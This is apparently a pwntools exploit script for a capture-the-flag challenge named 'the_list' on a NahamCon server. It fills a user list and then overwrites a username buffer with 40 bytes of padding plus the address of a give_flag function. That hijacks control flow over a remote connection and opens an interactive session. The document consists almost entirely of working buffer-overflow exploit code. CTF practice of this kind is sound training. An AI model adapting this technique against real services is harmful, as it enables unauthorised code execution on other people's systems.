#!/usr/bin/env python
from pwn import *

context.binary = elf = ELF('the_list')
p = remote("challenge.nahamcon.com", 31980)

# context.log_level = "debug"
# p = process(elf.path)
# gdb.attach(p, 'init-gef\nbreak *0x00401a04')

def option(num):
    p.sendlineafter("> ", str(num))


def add_user(username):
    option(2)
    p.sendlineafter("user\'s name: ", username)

def change_uname(idx, new_username):
    option(4)
    p.sendlineafter("you want to change? ", str(idx))
    p.sendlineafter("new user's name? ", new_username)

p.sendlineafter(" your name: ", "A")

for i in range(0x12):
    add_user("A")

change_uname(0x12, "A" * 40 + p64(elf.symbols['give_flag']))

option(5)


p.interactive()
